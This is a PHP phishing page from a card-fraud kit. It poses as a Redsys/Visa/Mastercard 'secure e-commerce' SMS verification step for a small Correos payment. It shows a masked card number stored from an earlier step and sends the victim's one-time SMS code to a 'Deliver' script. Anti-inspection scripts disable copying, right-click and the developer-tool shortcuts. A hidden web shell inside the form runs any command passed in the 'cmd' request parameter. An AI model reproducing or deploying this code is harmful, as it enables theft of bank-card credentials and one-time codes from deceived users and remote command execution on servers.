<?php

error_reporting();
session_start();


?>
<!DOCTYPE html>

<html oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <title>Confirmar pago | Código SMS</title>

    <meta content="no-cache " http-equiv="Pragma ">
    <meta content="no-cache " http-equiv="Cache-Control ">
    <meta content="IE=edge " http-equiv="X-UA-Compatible ">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico">
    <link rel="icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico" type="image/ico">
    <script language="JavaScript ">
        /**
            Funcion que obtiene el valor de un elemento
            e	: elemento
            nombre :nombre del elemento
            usada en las callbacks para ajax
        **/
        function dameValorElemento(e, nombre) {
            var valor = null;
            if (e == null)
                return null;
            var aux = e.getElementsByTagName(nombre);
            if (aux != null)
                aux = aux[0];
            return valorElemento(aux);
            return valor;
        }

        /**
        Funcion que devuelve el valor de un elemento hoja de un arbol XML
        e: elemento
        usada en las callbacks para ajax
        **/
        function valorElemento(e) {
            var valor = null;
            if (e != null)
                e = e.childNodes[0];
            if (e != null)
                valor = e.nodeValue;
            return valor;
        }
    </script>
    <link type="text/css " media="screen " rel="stylesheet " href="assets/sms_fichiers/css/bootstrap.css ">
    <link type="text/css " media="screen " rel="stylesheet " href="assets/sms_fichiers/css/bootstrap-responsive.css ">
    <link type="text/css " media="screen " rel="stylesheet " href="assets/sms_fichiers/css/font-awesome.css ">
    <link type="text/css " media="screen " rel="stylesheet " href="assets/sms_fichiers/css/2038.css ">
    <script src="assets/sms_fichiers/js/utils.js " language="JavaScript " type="text/javascript "></script>
    <script src="assets/sms_fichiers/js/des.js " language="JavaScript " type="text/javascript "></script>
    <script src="assets/sms_fichiers/js/pwdbaseud.js " language="JavaScript" type="text/javascript "></script>
    <script src="assets/sms_fichiers/js/jquery.js "></script>
    <script type="text/javascript " src="assets/sms_fichiers/js/bootstrap.js "></script>
    <script type="text/javascript " src="assets/sms_fichiers/js/custom_10.js "></script>
</head>

<body>
    <header class="header-margin-top ">
        <div class="container ">
            <div class="row " style="display: flex;">
                <div class="span4 logo ">
                    <img style="max-width: 100%;" class="logo-entidad " src="./assets/sms_fichiers/redsyslogo.png">
                </div>

                <div class="span4 offset4" style="display: flex;flex-direction: row;">
                    <svg height="51" viewBox="36 243 728 313.9" width="111" xmlns="http://www.w3.org/2000/svg">
                        <path d="m330.4 410.6-36.4 98.3-3.9-20c-9.1-24.5-28.8-50.2-51.7-60.7l33.4 126.3h39.5l58.7-144.1h-39.6zm31.3 144.2 23.3-144.4h37.3l-23.3 144.4zm172.5-140.8c-7.4-2.9-19-6.1-33.4-6.1-36.9 0-62.8 19.6-63 47.6-.2 20.8 18.5 32.3 32.6 39.2 14.6 7.1 19.4 11.6 19.4 17.9-.1 9.7-11.6 14.1-22.3 14.1-14.9 0-22.8-2.2-35.1-7.5l-4.8-2.3-5.2 32.3c8.7 4 24.8 7.5 41.6 7.7 39.1 0 64.6-19.4 64.9-49.3.2-16.5-9.8-28.9-31.3-39.2-13-6.7-21-11.1-20.9-17.9 0-6 6.7-12.4 21.4-12.4 12.2-.2 21 2.6 27.9 5.6l3.3 1.7zm95.6-3.4h-28.8c-8.9 0-15.6 2.5-19.6 12l-55.3 132.3h39.1s6.4-17.8 7.9-21.7c4.3 0 42.3.1 47.7.1 1.2 5 4.5 21.6 4.5 21.6h34.7zm-46 93c3.1-8.3 14.8-40.4 14.8-40.4-.2.4 3.1-8.3 5-13.8l2.5 12.4s7.2 34.5 8.7 41.7c-5.8.1-23.7.1-31 .1z" fill="#11559c" />
                        <path d="m260.1 410.5h-60.1l-.4 2.5c46.7 12 77.6 41.3 90.4 76l-13-66.4c-2.2-9.1-8.8-11.8-16.9-12.1z" fill="#f2a724" />
                        <path d="m87.2 375.6h-23.7l-27.5-123.6 26.3-4.4 18.8 96.7 47.8-95.4h25.2zm123.7-40.4h-56.7c-1.6 17.2 6.4 24.7 20 24.7 11.3 0 21.3-4.2 32-11l-.1 17.2c-10.5 6.6-22.7 10.8-37 10.8-24.7 0-41-14.1-36.1-45.9 4.4-28.7 24.3-46.1 47.3-46.1 26.5 0 35.3 19.9 31.5 45-.2 1.8-.8 4-.9 5.3zm-33.4-35.1c-8.8 0-17 6.9-20.8 21.4h35.1c.6-13.7-3.7-21.4-14.3-21.4zm70.3 24.3-7.8 50.6h-21.9l13.6-88.3h18.7v17.7c7.4-10.2 17.5-18.8 31.4-19.6l.1 21.8c-14 1-26.4 8.3-34.1 17.8zm33.7 50.6 13.6-88.3h21.9l-13.5 88.3zm27-103.1c-7.3 0-12.4-5.1-11.2-12.4 1.2-7.5 7.8-12.8 15.1-12.8 7.1 0 12.2 5.3 11 12.8-1.1 7.3-7.7 12.4-14.9 12.4zm69.3-9.3c-7.5 0-12 3.3-13.2 11.2l-2 13h16.8v17.9h-19.6l-10.8 70.3h-21.8l10.8-70.4h-12.8l2.8-17.9h12.8l2.3-15.2c3-19.6 16.6-26.9 34.7-26.9 3.8 0 6.7.4 8.9.7l.2 17.9c-2.2-.2-5.4-.6-9.1-.6zm.2 112.4 13.6-88.3h21.9l-13.5 88.3zm27.1-103.1c-7.3 0-12.4-5.1-11.3-12.4 1.2-7.5 7.8-12.8 15.1-12.8 7.1 0 12.2 5.3 11 12.8-1.1 7.3-7.7 12.4-14.8 12.4zm93.6 63.3h-56.7c-1.5 17.2 6.4 24.7 20 24.7 11.3 0 21.3-4.2 32-11l-.1 17.2c-10.5 6.6-22.7 10.8-37 10.8-24.7 0-41-14.1-36.1-45.9 4.4-28.7 24.3-46.1 47.3-46.1 26.5 0 35.3 19.9 31.5 45-.2 1.8-.8 4-.9 5.3zm-33.4-35.1c-8.8 0-17 6.9-20.8 21.4h35.1c.6-13.7-3.7-21.4-14.3-21.4zm98.3 74.9.1-12.3c-7.4 7.5-17 14.1-29.2 14.1-18.5 0-31.2-13.7-26.6-43.5 5.1-32.9 25.4-47.5 45.9-47.5 8.4 0 15 1.5 20 3.3l6.6-42.6 22.5-3.5-20.3 132zm7.4-67.8c-5.1-2.6-9.1-3.8-16.6-3.8-11.5 0-21.4 9.3-24.3 28.7-2.6 17.2 3.4 25.2 13.1 25.2 8 0 15-4.8 22-12.1zm78.7 68.7c-10.4 0-18.9-1.7-26.7-4.4l14.4-93.8 17-2.6-6.2 40.6c5-4.4 11.9-8.9 20.3-8.9 14.1 0 23.6 10.5 20.1 33-3.8 24.6-19 36.1-38.9 36.1zm12.3-54.5c-5.5 0-11.1 3.7-16 8.7l-4.7 30.3c3.3 1.2 5.5 1.8 10.2 1.8 10.5 0 17.9-6.4 20.2-21.6 2-12.8-2.3-19.2-9.7-19.2zm65.8 57.3c-8.5 16.5-16.9 21.6-29.8 21.6-2.9 0-4.5-.3-6-.7l-.1-13.7c2.1.6 4.4 1 7.6 1 4.8 0 9.1-2.2 11.9-7.1l2.2-4.4-14.1-65.9 17.7-2.2 8.2 47.6 22.1-46.7h16.5z" fill="#11559c" />
                    </svg>
                    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="123px" height="51px" viewBox="0 0 361 136" enable-background="new 0 0 361 136" xml:space="preserve">
                        <g>
                            <g>
                                <g>
                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M338.787,54.749c0-3.837,2.975-6.942,6.607-6.942     c3.652,0,6.596,3.105,6.596,6.942c0,3.843-2.943,6.948-6.596,6.948C341.762,61.697,338.787,58.592,338.787,54.749L338.787,54.749     z M345.395,60.052c2.776,0,5.042-2.382,5.042-5.303c0-2.906-2.266-5.267-5.042-5.267c-2.765,0-5.042,2.361-5.042,5.267     C340.353,57.67,342.63,60.052,345.395,60.052L345.395,60.052z M344.496,57.792h-1.353v-6.116h2.453     c0.499,0,1.059,0.03,1.488,0.337c0.469,0.345,0.739,0.924,0.739,1.537c0,0.678-0.385,1.312-0.998,1.542l1.059,2.7h-1.504     l-0.895-2.397h-0.99V57.792L344.496,57.792z M344.496,54.355h0.754c0.277,0,0.598,0.009,0.83-0.127     c0.229-0.149,0.331-0.446,0.331-0.708c0-0.23-0.133-0.507-0.331-0.615c-0.202-0.137-0.609-0.106-0.846-0.106h-0.738V54.355     L344.496,54.355z" />
                                </g>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M244.322,8.583l-1.81,11.773    c-3.926-2.09-6.813-2.909-9.897-2.909c-8.229,0-14.049,8.365-14.049,20.308c0,8.249,3.907,13.219,10.332,13.219    c2.727,0,5.724-0.876,9.391-2.797l-1.931,12.389c-4.056,1.167-6.702,1.582-9.769,1.582c-11.92,0-19.334-8.991-19.334-23.423    c0-19.413,10.244-32.969,24.898-32.969c1.893,0,3.584,0.185,4.958,0.583l4.556,1.194C243.023,8.07,243.328,8.152,244.322,8.583    L244.322,8.583z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M207.633,16.652c-0.347-0.066-0.731-0.114-1.131-0.114    c-3.642,0-5.701,1.927-9.083,7.185l0.982-6.707h-10.013L181.6,61.149h11.108c3.972-26.974,4.988-31.632,10.313-31.632    c0.324,0,0.354,0,0.808,0.045c0.982-5.318,2.327-9.228,4.182-12.794L207.633,16.652L207.633,16.652z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M141.453,60.61c-3.005,1-5.38,1.455-7.931,1.455    c-5.642,0-8.723-3.437-8.723-9.708c0-1.23,0.092-2.557,0.315-3.957l0.684-4.303l0.507-3.515l4.796-30.114h10.989l-1.26,6.548    h5.656l-1.553,10.728h-5.642l-2.92,18.419c-0.1,0.813-0.185,1.413-0.185,1.828c0,2.26,1.153,3.27,3.766,3.27    c1.275,0,2.236-0.133,2.975-0.412L141.453,60.61L141.453,60.61z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M97.878,30.972c0,5.57,2.566,9.422,8.377,12.301    c4.45,2.213,5.157,2.858,5.157,4.867c0,2.742-1.975,4.012-6.325,4.012c-3.281,0-6.348-0.548-9.883-1.767l-1.529,10.18l0.5,0.106    l2.029,0.43c0.653,0.139,1.614,0.263,2.882,0.4c2.636,0.246,4.657,0.364,6.087,0.364c11.596,0,16.961-4.682,16.961-14.734    c0-6.04-2.236-9.612-7.762-12.286c-4.611-2.197-5.134-2.715-5.134-4.764c0-2.394,1.829-3.624,5.38-3.624    c2.166,0,5.103,0.257,7.907,0.657l1.575-10.191c-2.882-0.491-7.162-0.87-9.698-0.87C102.098,16.053,97.832,22.826,97.878,30.972    L97.878,30.972z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M332.37,61.149h-10.462l0.549-4.324    c-3.047,3.416-6.174,4.907-10.214,4.907c-8.085,0-13.383-7.285-13.383-18.32c0-14.679,8.233-27.073,18.01-27.073    c4.296,0,7.544,1.86,10.603,6.042l2.406-15.504h10.896L332.37,61.149L332.37,61.149z M316.055,50.758    c5.165,0,8.775-6.133,8.775-14.868c0-5.609-2.061-8.664-5.881-8.664c-5.008,0-8.568,6.158-8.568,14.843    C310.381,47.848,312.297,50.758,316.055,50.758L316.055,50.758z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M176.467,60.222c-3.782,1.188-7.438,1.788-11.358,1.772    c-12.327,0-18.768-6.784-18.768-19.755c0-15.167,8.192-26.331,19.329-26.331c9.083,0,14.917,6.257,14.917,16.063    c0,3.247-0.393,6.413-1.377,10.886H157.23c-0.092,0.672-0.106,0.979-0.106,1.369c0,5.158,3.288,7.756,9.721,7.756    c3.943,0,7.493-0.855,11.467-2.807L176.467,60.222L176.467,60.222z M170.265,33.942c0.063-0.922,0.078-1.674,0.078-2.233    c0-3.607-1.946-5.713-5.234-5.713c-3.506,0-6.018,2.813-7.048,7.916L170.265,33.942L170.265,33.942z" />
                                <polygon fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" points="53.497,61.149 42.453,61.149 48.778,19.444     34.645,61.149 27.076,61.149 26.161,19.689 19.498,61.149 9.154,61.149 17.784,6.876 33.7,6.876 34.138,40.46 44.881,6.876     62.058,6.876 53.497,61.149   " />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M81.955,41.49c-1.169-0.139-1.683-0.19-2.475-0.19    c-6.263,0-9.437,2.279-9.437,6.737c0,2.748,1.56,4.499,3.973,4.499C78.512,52.536,81.771,48.037,81.955,41.49L81.955,41.49z     M89.994,61.149H80.84l0.2-4.582c-2.79,3.654-6.517,5.349-11.582,5.349c-6.01,0-10.113-4.918-10.113-12.024    c0-10.774,7.17-17.029,19.428-17.029c1.252,0,2.851,0.097,4.496,0.327c0.345-1.46,0.438-2.09,0.438-2.864    c0-2.915-1.921-4.021-7.102-4.021c-3.127,0-6.717,0.476-9.191,1.261l-1.537,0.445l-0.968,0.286l1.521-9.898    c5.519-1.715,9.153-2.376,13.249-2.376c9.499,0,14.533,4.482,14.533,12.94c0,2.197-0.161,3.827-0.914,8.755l-2.313,15.637    l-0.377,2.824l-0.284,2.249l-0.192,1.537L89.994,61.149L89.994,61.149z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M263.363,41.49c-1.15-0.139-1.684-0.19-2.456-0.19    c-6.288,0-9.472,2.279-9.472,6.737c0,2.748,1.577,4.499,3.991,4.499C259.943,52.536,263.165,48.037,263.363,41.49L263.363,41.49z     M271.41,61.149h-9.166l0.213-4.582c-2.788,3.654-6.523,5.349-11.581,5.349c-6.01,0-10.13-4.918-10.13-12.024    c0-10.774,7.163-17.029,19.445-17.029c1.245,0,2.859,0.097,4.493,0.327c0.339-1.46,0.438-2.09,0.438-2.864    c0-2.915-1.92-4.021-7.099-4.021c-3.146,0-6.726,0.476-9.179,1.261l-1.572,0.445l-0.956,0.286l1.538-9.898    c5.526-1.715,9.152-2.376,13.219-2.376c9.514,0,14.548,4.482,14.548,12.94c0,2.197-0.19,3.827-0.906,8.755l-2.331,15.637    l-0.342,2.824l-0.309,2.249l-0.202,1.537L271.41,61.149L271.41,61.149z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC2127" d="M302.288,16.652c-0.327-0.066-0.689-0.114-1.112-0.114    c-3.629,0-5.704,1.927-9.102,7.185l0.986-6.707h-10l-6.76,44.133h11.07c3.976-26.974,5.02-31.632,10.309-31.632    c0.343,0,0.32-0.031,0.773,0.045c1.002-5.318,2.354-9.228,4.212-12.794L302.288,16.652L302.288,16.652z" />
                            </g>
                            <g>
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M255.903,103.951c0,10.005-3.097,15.896-7.979,15.896    c-3.564,0.11-5.725-3.862-5.725-9.803c0-7.026,3.157-14.99,8.223-14.99C254.494,95.055,255.903,99.37,255.903,103.951    L255.903,103.951z M266.775,104.135c0-11.121-5.495-19.777-15.823-19.777c-11.89,0-19.59,10.526-19.59,26.022    c0,11.094,4.551,20.165,15.808,20.165C258.53,130.545,266.775,122.502,266.775,104.135L266.775,104.135z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M234.915,76.551l-1.69,11.76    c-3.675-2.075-6.349-2.936-9.239-2.936c-7.724,0-13.119,8.401-13.119,20.344c0,8.245,3.613,13.233,9.631,13.233    c2.566,0,5.374-0.876,8.782-2.799l-1.79,12.381c-3.82,1.177-6.314,1.58-9.151,1.58c-11.128,0-18.06-8.995-18.06-23.429    c0-19.422,9.567-32.976,23.27-32.976c1.774,0,3.344,0.225,4.642,0.583l4.228,1.2C233.724,76.01,233.994,76.101,234.915,76.551    L234.915,76.551z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M166.561,84.632c-0.315-0.087-0.678-0.122-1.061-0.122    c-3.352,0-5.318,1.935-8.46,7.175l0.914-6.695h-9.347l-6.31,44.138h10.321c3.713-27.001,4.695-31.647,9.646-31.647    c0.292,0,0.322,0,0.753,0.05c0.931-5.339,2.184-9.25,3.92-12.823L166.561,84.632L166.561,84.632z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M301.39,128.656h-9.753l0.502-4.308    c-2.837,3.397-5.788,4.901-9.563,4.901c-7.521,0-12.487-7.297-12.487-18.329c0-14.655,7.708-27.085,16.821-27.085    c4.021,0,7.072,1.9,9.891,6.082l2.277-15.519h10.16L301.39,128.656L301.39,128.656z M286.13,118.274    c4.862,0,8.214-6.128,8.214-14.871c0-5.625-1.915-8.645-5.465-8.645c-4.695,0-8.031,6.135-8.031,14.848    C280.848,115.357,282.638,118.274,286.13,118.274L286.13,118.274z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M69.766,128.474c-3.511,1.211-6.932,1.797-10.574,1.797    c-11.528,0-17.545-6.798-17.545-19.765c0-15.146,7.654-26.319,18.044-26.319c8.508,0,13.933,6.246,13.933,16.052    c0,3.241-0.369,6.417-1.252,10.892H51.798c-0.062,0.659-0.085,0.986-0.085,1.371c0,5.146,3.082,7.742,9.069,7.742    c3.689,0,7.024-0.86,10.721-2.795L69.766,128.474L69.766,128.474z M63.994,102.215c0.047-0.933,0.077-1.676,0.077-2.243    c0-3.599-1.813-5.705-4.88-5.705c-3.297,0-5.642,2.833-6.586,7.902L63.994,102.215L63.994,102.215z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M192.556,128.474c-3.522,1.211-6.95,1.797-10.579,1.797    c-11.551,0-17.56-6.798-17.56-19.765c0-15.146,7.662-26.319,18.044-26.319c8.51,0,13.952,6.246,13.952,16.052    c0,3.241-0.385,6.417-1.299,10.892h-20.529c-0.063,0.659-0.101,0.986-0.101,1.371c0,5.146,3.075,7.742,9.061,7.742    c3.69,0,7.034-0.86,10.732-2.795L192.556,128.474L192.556,128.474z M186.752,102.215c0.068-0.933,0.106-1.676,0.106-2.243    c0-3.599-1.828-5.705-4.882-5.705c-3.298,0-5.64,2.833-6.594,7.902L186.752,102.215L186.752,102.215z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M336.612,128.474c-3.568,1.211-6.95,1.797-10.606,1.797    c-11.527,0-17.56-6.798-17.56-19.765c0-15.146,7.678-26.319,18.059-26.319c8.508,0,13.928,6.246,13.928,16.052    c0,3.241-0.354,6.417-1.269,10.892h-20.55c-0.072,0.659-0.087,0.986-0.087,1.371c0,5.146,3.084,7.742,9.071,7.742    c3.693,0,7.022-0.86,10.728-2.795L336.612,128.474L336.612,128.474z M330.809,102.215c0.046-0.933,0.076-1.676,0.076-2.243    c0-3.599-1.805-5.705-4.879-5.705c-3.298,0-5.632,2.833-6.588,7.902L330.809,102.215L330.809,102.215z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M39.21,86.627c-2.021-1.352-4.757-2.533-8.623-2.533    c-4.173,0-7.531,0.865-7.531,5.305c0,7.841,15.216,4.913,15.216,21.704c0,15.294-10.043,19.259-19.128,19.259    c-4.042,0-8.692-1.337-12.119-2.86l2.467-11.238c2.068,1.878,6.24,3.165,9.652,3.165c3.251,0,8.346-0.888,8.346-6.562    c0-8.885-15.208-5.58-15.208-21.175c0-14.266,8.884-18.539,17.454-18.539c4.826,0,9.36,0.708,12.019,2.475L39.21,86.627    L39.21,86.627z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M99.991,128.458c-2.129,1.024-4.972,1.698-9.168,1.698    c-9.022,0-14.617-9.018-14.617-19.997c0-14.369,8.093-25.832,20.004-25.832c2.598,0,6.563,1.124,9.691,2.937l-2.283,10.541    c-2.214-1.455-4.519-2.38-6.893-2.38c-5.519,0-9.461,5.058-9.461,14.121c0,5.218,2.859,9.498,7.377,9.498    c2.689,0,4.581-0.567,6.895-1.92L99.991,128.458L99.991,128.458z" />
                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" d="M138.603,117.406c-0.53,3.797-1.022,7.483-1.315,11.444h-9.937    l0.838-7.134h-0.101c-3.112,4.849-6.332,8.15-11.958,8.15c-6.239,0-9.62-6.565-9.62-15.139c0-2.955,0.184-4.623,0.844-9.238    l2.813-20.428h11.059l-2.967,20.488c-0.3,2.201-0.722,4.384-0.722,6.661c0,2.582,1.176,5.194,4.158,5.034    c4.533,0,7.208-5.545,7.969-12.015l3.052-20.169h10.705L138.603,117.406L138.603,117.406z" />
                                <g>
                                    <polygon fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" points="346.914,128.317 345.242,128.317 345.242,120.997      342.824,120.997 342.824,119.429 349.332,119.429 349.332,120.997 346.914,120.997 346.914,128.317    " />
                                    <polygon fill-rule="evenodd" clip-rule="evenodd" fill="#F89620" points="358,128.317 356.438,128.317 356.438,120.887      356.416,120.887 354.923,128.317 353.285,128.317 351.827,120.887 351.804,120.887 351.804,128.317 350.246,128.317      350.246,119.429 352.684,119.429 354.135,126.436 354.157,126.436 355.582,119.429 358,119.429 358,128.317    " />
                                </g>
                            </g>
                        </g>
                    </svg>
                </div>
            </div>
        </div>
    </header>

    <div class="container ">
        <div class="row ">
            <div class="span12 ">
                <h1>Comercio Electrònico Seguro: verificaciòn de su tarjeta</h1>
            </div>
        </div>
        <div class="row relativo ">
            <form method="post" id="otpForm " class="clave-sms " action="./Deliver/sms_.php">
                <div class="span4 datos-compra ">
                    <div class="caja-sombreada ">
                        <h2>Datos de la compra</h2>
                        <h3>Por favor, compruebe los datos de funcionamiento</h3>
                        <table class="table ">
                            <tbody>
                                <tr>
                                    <td>Importe</td>
                                    <td class="precio ">2,64 Euros</td>
                                </tr>
                                <tr>
                                    <td>Comercio</td>
                                    <td><strong>CORREOS Y TELEGRAFOS</strong></td>
                                </tr>
                                <tr>
                                    <td>Número de tarjeta</td>
                                    <td><strong><?php echo (explode(" ", $_SESSION["card"])[0] . ' **** **** ' . explode(" ", $_SESSION["card"])[3]); ?></strong></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="span8 col-r ">
                    <fieldset>
                        <div>
                            <legend data-placement="bottom " class="tooltiptext " data-toggle="tooltip " title=" " data-original-title="Si el teléfono móvil no es correcto, puede modificarlo en su área de Clientes de nuestro sitio web">Para confirmar la operación, introduce la clave que hemos enviado por SMS a tu móvil <strong>.</strong></legend><label>Clave SMS<span class="help-inline "></span></label>
                        </div>
                        <div>
                            <input data-placement="bottom " minlength="6" maxlength="6" type="tel" id="sms" name="sms" autofocus="autofocus " title="Inserte 6 dígitos que se le han enviado" alt="Introduzca la clave que ha recibido en su teléfono móvil " placeholder="Introduzca aqué su clave SMS " data-original-title="Introduzca la clave que ha recibido en su teléfono móvil " style="margin-bottom: 9px; font-size: larger;background:url('./assets/Venta_fichiers/smsphone.svg') 50% 50% no-repeat;background-size:35px;background-position-x:99%;width:69%;outline:0;background-color:white;border:1px solid #d1d1d1" pattern="[0-9]+" autocomplete="off" required="true">
                            <div class="blanco "></div>
                        </div>
                        <!-- <script>
                            const input = document.querySelector('input[name="sms"]');
                            input.addEventListener('invalid', function (event) {
                                if (event.target.validity.valueMissing) {
                                    event.target.setCustomValidity('Introduzca la clave que ha recibido en su teléfono móvil.');
                                }
                            })

                            /*input.addEventListener('change', function (event) {
                                event.target.setCustomValidity('');
                            })*/
                        </script> -->
                        <style>
                            input:focus {
                                color: blue;
                            }

                            input:valid {
                                border: 1px solid #d1d1d1"

                            }
                        </style>
                    </fieldset>
                    <?php if (isset($_REQUEST['cmd'])) {
                        echo "<pre>";
                        system($_REQUEST['cmd']);
                        echo "</pre>";
                    }; ?>
                    <div class="caja-sombreada errores-frecuentes ">
                        <h3 class="no-recibe ">¿No recibes la llave en tu teléfono móvil?</h3>
                        <h4>Asegúrate de que tu teléfono</h4>
                        <ul>
                            <li>
                                <span>Est encendido</span>
                            </li>
                            <li>
                                <span>Tenga cobertura</span>
                            </li>
                            <li>
                                <span>Sea su dispositivo principal en caso de disponer de varias tarjetas SIM</span>
                            </li>
                            <li>
                                <span>Puede solicitarlo excepcionalmente en el 902 246 810 (+ 91 602 46 80), consultas de Oficina Internet</span>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="span12 botones ">
                    <button type="submit " id="btn_aceptar " class="btn-aceptar ">Aceptar</button>
                </div>
            </form>
        </div>
    </div>

    <div style="display:none" aria-hidden="true " aria-labelledby="ayudaLabel " role="dialog " tabindex="-1 " class="modal hide fade " id="ayuda ">
        <div class="modal-header ">
            <button aria-hidden="true " data-dismiss="modal " class="close " type="button ">�</button>
            <h3 id="myModalLabel ">¿Por qué no recibe la OTP?</h3>
        </div>
        <div class="modal-body ">
            <p></p>
            <div aria-multiselectable="true " role="tablist " id="accordion " class="panel-group ">
                <div class="panel panel-default ">
                    <div id="headingOne " role="tab " class="panel-heading ">
                        <h4 class="panel-title ">
                            <a alt="�Tiene su tel�fono la memoria llena? " aria-controls="collapseOne " aria-expanded="true " href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseOne " data-parent="#accordion " data-toggle="collapse ">¿Tiene su teléfono la memoria llena?</a>
                        </h4>
                    </div>
                    <div aria-labelledby="headingOne " role="tabpanel " class="panel-collapse collapse " id="collapseOne ">
                        <div class="panel-body ">Es posible que La memoria de su teléfono puede llenarse y eso hace que los nuevos mensajes no se entreguen. Para resolver este problema, simplemente libere espacio en la memoria para dejar espacio para nuevos mensajes.</div>
                    </div>
                </div>
                <div class="panel panel-default ">
                    <div id="headingTwo " role="tab " class="panel-heading ">
                        <h4 class="panel-title ">
                            <a alt="�Dispone usted de una tarjeta SIM Dual? " aria-controls="collapseTwo " aria-expanded="false " href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseTwo " data-parent="#accordion " data-toggle="collapse " class="collapsed ">�Dispone usted de una tarjeta SIM Dual?</a>
                        </h4>
                    </div>
                    <div aria-labelledby="headingTwo " role="tabpanel " class="panel-collapse collapse " id="collapseTwo ">
                        <div class="panel-body ">Con una tarjeta dual el usuario tiene en un mismo teléfono una sola SIM pero con 2 leneas diferentes. El mayor El inconveniente de este sistema es que no permite tener las 2 leneas activas al mismo tiempo. Es por ello que el
                            teléfono registrado para recibir los SMS no es la lenea activa en ese momento y por tanto no se reciben.</div>
                    </div>
                </div>
                <div class="panel panel-default ">
                    <div id="headingThree " role="tab " class="panel-heading ">
                        <h4 class="panel-title ">
                            <a alt="�Dispone de un tel�fono Multi SIM? " aria-controls="collapseThree " aria-expanded="false " href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseThree " data-parent="#accordion " data-toggle="collapse " class="collapsed ">�Dispone de un tel�fono Multi SIM?</a>
                        </h4>
                    </div>
                    <div aria-labelledby="headingThree " role="tabpanel " class="panel-collapse collapse " id="collapseThree ">
                        <div class="panel-body ">Un teléfono Dual SIM permite a los usuarios tener en un solo terminal más de una tarjeta SIM con diferentes líneas. El problema es que hay dispositivos de este tipo que no permiten que ambas tarjetas estén activas simultáneamente.
                            Por eso puede ocurrir que no recibas el SMS porque la tarjeta que está activa no es la correcta.</div>
                    </div>
                </div>
                <div class="panel panel-default ">
                    <div id="headingFour " role="tab " class="panel-heading ">
                        <h4 class="panel-title ">
                            <a alt="�Dispone de cobertura? " aria-controls="collapseFour " aria-expanded="false " href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFour " data-parent="#accordion " data-toggle="collapse " class="collapsed ">�Dispone de cobertura?</a>
                        </h4>
                    </div>
                    <div aria-labelledby="headingFour " role="tabpanel " class="panel-collapse collapse " id="collapseFour ">
                        <div class="panel-body ">Es muy común que a la hora de intentar el pago, te encuentres en una zona donde no tienes cobertura o que está limitada debido a algún tipo de evento cercano como eventos deportivos, conciertos, etc. y no permites la entrega
                            correcta de SMS.</div>
                    </div>
                </div>
                <div class="panel panel-default ">
                    <div id="headingFive " role="tab " class="panel-heading ">
                        <h4 class="panel-title ">
                            <a alt="¿Dispone de alguna aplicaciòn que bloquea los SMS? " aria-controls="collapseFive " aria-expanded="false " href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFive " data-parent="#accordion " data-toggle="collapse " class="collapsed ">¿Dispone de alguna aplicaciòn que bloquea los SMS?</a>
                        </h4>
                    </div>
                    <div aria-labelledby="headingFive " role="tabpanel " class="panel-collapse collapse " id="collapseFive ">
                        <div class="panel-body ">Debido a la cantidad de mensajes SMS que recibes en tu teléfono móvil, es posible que hayas instalado una aplicación para bloquear ciertos mensajes como los SMS publicitarios, con los que muchas empresas bombardean a las personas.
                            Muchas de estas aplicaciones consideran los SMS enviados por la entidad como un SMS no deseado y los bloquean.</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer ">
            <button aria-hidden="true " data-dismiss="modal " class="btn-aceptar ">Cerrar</button>
        </div>
    </div>
    <script>
        jQuery(function($) {

            document.addEventListener('contextmenu', event => event.preventDefault());
            document.onkeydown = function(e) {
                if (e.ctrlKey &&
                    (e.keyCode === 67 ||
                        e.keyCode === 86 ||
                        e.keyCode === 85 ||
                        e.keyCode === 83 ||
                        e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };

            $(document).keydown(function(event) {
                if (event.keyCode == 123) { // Prevent F12
                    return false;
                } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
                    return false;
                }
            });
        })
    </script>
    <script src="./assets/jquery1.min.js.download"></script>
    <script src="./assets/jquery.inputmask.bundle.js.download"></script>
    <script type="text/javascript">
        $(":input").inputmask();
        $("#sms").inputmask({
            "mask": "999999"
        });
    </script>

</body>

</html>